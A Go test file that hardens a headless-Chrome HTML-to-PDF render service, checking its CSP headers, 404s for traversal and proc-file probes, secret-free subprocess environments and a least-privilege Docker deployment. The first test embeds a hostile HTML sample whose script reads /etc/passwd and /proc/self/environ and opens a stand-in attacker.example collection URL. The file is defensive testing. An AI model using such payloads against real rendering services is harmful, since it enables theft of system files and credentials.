package main

import (
	"context"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestRenderPrintServerConfinesMaliciousDocumentToOpaqueHTTPOrigin(t *testing.T) {
	malicious := `<!doctype html><html><body>
<script>
fetch('file:///etc/passwd').then(r => r.text()).then(t => document.body.dataset.file=t);
fetch('file:///proc/self/environ').then(r => r.text()).then(t => document.body.dataset.env=t);
window.open('https://attacker.example/collect');
location.href='file:///proc/self/environ';
</script>
</body></html>`
	server, err := startRenderPrintServer(malicious)
	if err != nil {
		t.Fatalf("startRenderPrintServer: %v", err)
	}
	defer server.Close()
	if !strings.HasPrefix(server.URL, "http://127.0.0.1:") || strings.Contains(server.URL, "file:") {
		t.Fatalf("render URL=%q, want a loopback HTTP origin and never file://", server.URL)
	}

	response, err := http.Get(server.URL)
	if err != nil {
		t.Fatalf("GET render document: %v", err)
	}
	body, readErr := io.ReadAll(response.Body)
	response.Body.Close()
	if readErr != nil || string(body) != malicious {
		t.Fatalf("render body mismatch err=%v", readErr)
	}
	policy := response.Header.Get("Content-Security-Policy")
	for _, directive := range []string{
		"default-src 'none'",
		"connect-src 'none'",
		"frame-src 'none'",
		"object-src 'none'",
		"base-uri 'none'",
		"form-action 'none'",
		"sandbox allow-scripts",
		"navigate-to 'none'",
	} {
		if !strings.Contains(policy, directive) {
			t.Errorf("header CSP missing %q: %q", directive, policy)
		}
	}
	if response.Header.Get("Cache-Control") != "no-store" || response.Header.Get("X-Content-Type-Options") != "nosniff" {
		t.Fatalf("security headers incomplete: %+v", response.Header)
	}

	// The origin is deliberately a one-document server: guessed filesystem and
	// proc paths, traversal spellings, query variants, and non-GET requests do
	// not expose anything.
	base, err := url.Parse(server.URL)
	if err != nil {
		t.Fatalf("parse render URL: %v", err)
	}
	for _, attempt := range []string{"/etc/passwd", "/proc/self/environ", "/render/../../etc/passwd"} {
		probe := *base
		probe.Path = attempt
		probe.RawPath = ""
		probe.RawQuery = ""
		got, err := http.Get(probe.String())
		if err != nil {
			t.Fatalf("GET malicious path %q: %v", attempt, err)
		}
		_, _ = io.Copy(io.Discard, got.Body)
		got.Body.Close()
		if got.StatusCode != http.StatusNotFound {
			t.Errorf("malicious path %q status=%d, want 404", attempt, got.StatusCode)
		}
	}
	query := *base
	query.RawQuery = "file=/proc/self/environ"
	if got, err := http.Get(query.String()); err != nil {
		t.Fatalf("GET query variant: %v", err)
	} else {
		got.Body.Close()
		if got.StatusCode != http.StatusNotFound {
			t.Errorf("query variant status=%d, want 404", got.StatusCode)
		}
	}

	second, err := startRenderPrintServer("second")
	if err != nil {
		t.Fatalf("start second render origin: %v", err)
	}
	defer second.Close()
	if second.URL == server.URL {
		t.Fatal("two jobs reused the same render capability URL")
	}
}

func TestRenderSubprocessDoesNotInheritContainerSecrets(t *testing.T) {
	t.Setenv("BONFIRE_RUNNER_TOKEN", "callback-secret-must-not-reach-chrome")
	t.Setenv("OPENAI_API_KEY", "provider-secret-must-not-reach-chrome")
	t.Setenv("DATABASE_URL", "database-secret-must-not-reach-chrome")
	workDir := t.TempDir()
	stdout, stderr, err := runRenderExecCommandContext(context.Background(), "/usr/bin/env", nil, workDir)
	if err != nil {
		t.Fatalf("run env probe: %v stderr=%q", err, stderr)
	}
	for _, forbidden := range []string{"BONFIRE_RUNNER_TOKEN", "OPENAI_API_KEY", "DATABASE_URL", "callback-secret", "provider-secret", "database-secret"} {
		if strings.Contains(stdout, forbidden) {
			t.Errorf("render subprocess inherited %q:\n%s", forbidden, stdout)
		}
	}
	for _, required := range []string{"HOME=" + workDir, "TMPDIR=" + workDir, "PATH=", "TZ=UTC"} {
		if !strings.Contains(stdout, required) {
			t.Errorf("minimal render subprocess environment missing %q: %s", required, stdout)
		}
	}
}

func TestRenderRunnerDeploymentIsLeastPrivilegeAndHasNoBrainMount(t *testing.T) {
	composePath := filepath.Join("deploy", "digitalocean", "docker-compose.yml")
	raw, err := os.ReadFile(composePath)
	if err != nil {
		t.Fatalf("read compose: %v", err)
	}
	compose := string(raw)
	start := strings.Index(compose, "  render-runner:\n")
	if start < 0 {
		t.Fatal("could not find render-runner compose service")
	}
	end := strings.Index(compose[start:], "\n  coturn:\n")
	if end < 0 {
		t.Fatal("could not isolate render-runner compose service")
	}
	render := compose[start : start+end]
	for _, forbidden := range []string{"env_file:", "meeting_data", "seccomp:unconfined", "OPENAI_API_KEY", "ANTHROPIC_API_KEY"} {
		if strings.Contains(render, forbidden) {
			t.Errorf("render-runner service retains forbidden %q:\n%s", forbidden, render)
		}
	}
	for _, required := range []string{
		"BONFIRE_RUNNER_TOKEN:",
		"render_queue:/app/render-queue",
		"cap_drop:",
		"- ALL",
		"no-new-privileges:true",
		"read_only: true",
		"pids_limit:",
		"render_internal",
	} {
		if !strings.Contains(render, required) {
			t.Errorf("render-runner service missing %q:\n%s", required, render)
		}
	}

	dockerfileRaw, err := os.ReadFile("Dockerfile.render")
	if err != nil {
		t.Fatalf("read Dockerfile.render: %v", err)
	}
	dockerfile := string(dockerfileRaw)
	for _, required := range []string{
		"snapshot.debian.org/archive/debian/",
		"sha256sum -c -",
		"chmod 0755 /opt/chrome-headless-shell/chrome_sandbox",
		"USER 65532:65532",
	} {
		if !strings.Contains(dockerfile, required) {
			t.Errorf("Dockerfile.render missing %q", required)
		}
	}
	if strings.Contains(dockerfile, "ENTRYPOINT") && !strings.Contains(dockerfile, `ENTRYPOINT ["/app/meetingassist", "-render-runner"]`) {
		t.Error("Dockerfile.render entrypoint changed unexpectedly")
	}
	if !strings.Contains(compose, "  render-queue-init:\n") || !strings.Contains(compose, "condition: service_completed_successfully") {
		t.Error("render profile is missing the secretless one-shot queue ownership initializer")
	}
}

func TestRenderRunnerRejectsOversizedHTMLAtQueueAndExecution(t *testing.T) {
	tooLarge := strings.Repeat("x", defaultRenderMaxHTMLBytes+1)
	if _, err := enqueueRenderExportPDFJob("oversized", renderJobKindDeck, tooLarge, ""); err == nil {
		t.Fatal("queue accepted oversized attacker-authored HTML")
	}

	_, err := executeRenderExportPDF(context.Background(), renderExecConfig{
		ChromiumBin:  "/does/not/matter",
		PdftoppmBin:  "/does/not/matter",
		MaxHTMLBytes: 32,
	}, renderRunnerJob{
		ID:   "oversized-exec",
		Type: renderJobTypeExportPDF,
		HTML: strings.Repeat("x", 33),
	}, t.TempDir())
	if err == nil || !strings.Contains(err.Error(), "BONFIRE_RENDER_MAX_HTML_BYTES") {
		t.Fatalf("oversized execution err=%v", err)
	}
}
